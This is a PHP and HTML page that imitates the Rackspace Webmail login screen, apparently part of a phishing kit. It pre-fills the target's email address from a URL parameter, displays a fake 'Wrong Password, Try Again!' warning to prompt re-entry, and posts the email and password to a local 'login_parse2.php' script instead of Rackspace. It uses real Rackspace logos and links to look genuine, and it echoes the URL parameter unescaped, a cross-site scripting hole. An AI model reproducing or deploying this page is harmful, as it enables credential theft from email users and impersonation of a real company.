<?php 

$attmail = $_GET['user'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html><head>
  <meta charset="UTF-8">
  <title>Rackspace Webmail: Hosted Email for Business</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">

  <style>
    /* Page Defaults */
    * {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box;
    }

    body {
      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
      font-size: 14px;
      line-height: 1.42857;
      color: #333333;
      background-color: #FAFAFA;
      margin: 0;
    }

    .caption {
      display: inline-block;
      font-size: 12px;
      color: #666;
    }

    .base_link {
      display: inline-block;
      color: #0C7C84;
      text-decoration: none;
    }

    .base_links {
      background: #FFFFFF;
      text-align: center;
      padding-bottom: 20px;
      margin-top: -15px;
    }

    .divider {
      display: inline-block;
      margin: 0px 5px;
      color: #0C7C84;
    }
    /* Page Layout */
    #content {
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: #EAEAEA;
    }

    #content-header {
      height: 53px;
      padding: 16px;
      font-size: 24px;
      font-weight: 300;
      line-height: 18px;
      background: #424242;
      color: #FCFCFC;
    }

    #content-header-logo {
      float: right;
    }

    #logo {
      width: 130px;
      margin-top: -9px;
      margin-right: -5px;
    }

    #content-header-label {
      float: left;
    }

    #content-body {
      display: flex;
      justify-content: start;
      background: #FFFFFF;
      min-width: 790px;
    }

    #banner-section {
      height: 285px;
      width: 314px;
      margin: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    #banner {
      width: 190px;
    }

    #divider {
      border: 1px solid rgb(224, 224, 224);
      margin: 40px 0px;
    }
    /* Form Layout */
    #form {
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 20px;
      min-height: 268px;
      width: 100%;
    }

    #form-body {
      height: 205px;
      width: 100%;
      margin: 40px 0px 0px 20px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding-right: 20px;
    }

    #form-container {
      width: 100%;
      margin: 0px auto;
      padding: 0px 10px;
    }

    .row {
      margin: 0px -10px;
    }

      .row:before, .row:after {
        content: " ";
        display: table;
      }

    .col {
      width: 100%;
      float: left;
      position: relative;
      min-height: 1px;
      padding: 0px 10px;
    }

    .form-group {
      width: inherit;
      padding-right: 30px;
      margin-bottom: 20px;
    }

    .form-label {
      position: relative;
      font-family: Roboto;
      font-size: 16px;
      margin-bottom: 8px;
      line-height: 1;
      color: #616161;
      display: inline-block;
      max-width: 100%;
    }

    .form-field {
      border: 1px solid #BDBDBD;
      border-radius: 2px;
      background: #FFFFFF;
      font-family: Roboto;
      font-size: 16px;
      color: #616161;
      height: 32px;
      display: block;
      width: 100%;
      padding: 4px 8px;
      line-height: 1.42857;
      -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
    }

    #forgot-password {
      position: absolute;
      top: 0px;
      right: 40px;
      color: #0C7C84;
      text-decoration: none;
      background-color: transparent;
      box-sizing: border-box;
    }

    #login-btn-toolbar {
      float: right;
      margin: auto 30px 15px -20px;
    }

    #login-btn {
      float: right;
      display: inline-flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
      padding: 0 12px;
      height: 32px;
      line-height: 1px;
      font-size: 14px;
      font-weight: 400;
      text-transform: capitalize;
      color: #fff;
      background-color: #0C7C84;
      border-color: #0C7C84;
      margin-bottom: 0;
      text-align: center;
      vertical-align: middle;
      touch-action: manipulation;
      cursor: pointer;
      background-image: none;
      border: 1px solid transparent;
      white-space: nowrap;
      border-radius: 2px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    #form-container {
      width: 100%;
      margin: 0px auto;
      padding: 0px 10px;
    }

    @media only screen and (max-device-width: 480px) {
      /* Page Defaults */
      body {
        font-size: 19pt;
        line-height: 1.42857em;
      }

      .caption {
        display: inline-block;
        font-size: 80%;
        color: #666;
      }
      /* Page Layout */
      #content {
        align-items: inherit;
        display: inherit;
        justify-content: inherit;
      }

      #content-header {
        font-size: 171%;
        height: 3em;
        line-height: 1em;
        padding: 1em;
      }

      #content-header-logo {
        float: right;
      }

      #logo {
        margin-left: 6em;
        width: inherit;
        height: 1em;
      }

      #banner-section {
        display: none;
      }

      #divider {
        display: none;
      }
      /* Form Layout */
      .form-label {
        font-size: 114%;
      }

      .form-field {
        font-size: 114%;
        height: 2em;
      }

      #forgot-password {
        right: 2em;
        top: 0;
      }

      #login-btn-toolbar {
        margin: 1.5em 2em 1em -1.5em;
      }

      #login-btn {
        font-size: 150%;
        height: 3em;
        padding: 1.25em;
      }
    }
  </style>
</head>
<body>
  <div>
    <div id="content">
      <div>
        <div id="content-header">
          <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"></div>
          <div id="content-header-label">Webmail Login</div>
        </div>
        <div id="content-body">
          <div id="banner-section">
            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
              <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg">
            </a>
          </div>
          <div id="divider"></div>
          <form id="form" method="post" action="login_parse2.php" autocomplete="off">
  <div id="form-body">
    <div id="form-container">
      <input type="hidden" name="__RequestVerificationToken" value="CfDJ8IESnn5Lq6JOiqWtwfxxqKUD5ptyBCOFq3Rh9c6i2ULkwQq0hBE8nDvld0G8Q9PnO-Bm69cgodERvr11PQ5z35bVD1o_rnhBG4GEPkOSWrSlYkoV8PMcAeQDzK1W2BLrFchqtZJbeHGp2ISNXkjmKV4">
      <!-- destination and flags is used for OWA login -->
      <input id="form-destination" type="hidden" name="destination" value="">
      <input id="form-owa-flags" type="hidden" name="flags" value="4">
      <div id="user-row" class="row">
        <div id="user-col" class="col">
          <div id="user-field" class="form-group">
              <p style="color: red">
                  Wrong Password, Try Again!
                </p>
            <label id="user-label" class="form-label">Email address</label>
            <input id="user-input" name="user" type="email" tabindex="1" class="form-field" value="<?php echo $attmail; ?>" autocomplete="username">
          </div>
        </div>
      </div>
      <div id="pass-row" class="row">
        <div id="pass-col" class="col">
          <div id="pass-field" class="form-group">
            <label id="pass-label" class="form-label">Password</label>
            <input id="pass-input" name="pass" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password">
          </div>
          <a id="forgot-password" href="/wmidentity/recover/password" tabindex="4">Forgot password?</a>
        </div>
      </div>
    </div>
  </div>
  <div id="login-btn-toolbar">
    <button name="submit" id="login-btn" tabindex="3" type="submit">Log In</button>
  </div>
</form>
        </div>
        <div class="base_links">
          <a class="base_link" target="_blank" href="">
            Privacy Statement
          </a>
          <div class="divider"> | </div>
          <a class="base_link" target="_blank" href="#">
            Website Terms
          </a>
        </div>
        <div class="footer" style="text-align: center; margin-top: 10px;">
          <div class="caption">
            Need webmail for your business?  Learn more about
            <a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;">
              Hosted Email
            </a>
            from Rackspace
          </div>
        </div>
      </div>
    </div>
  </div>


</body></html>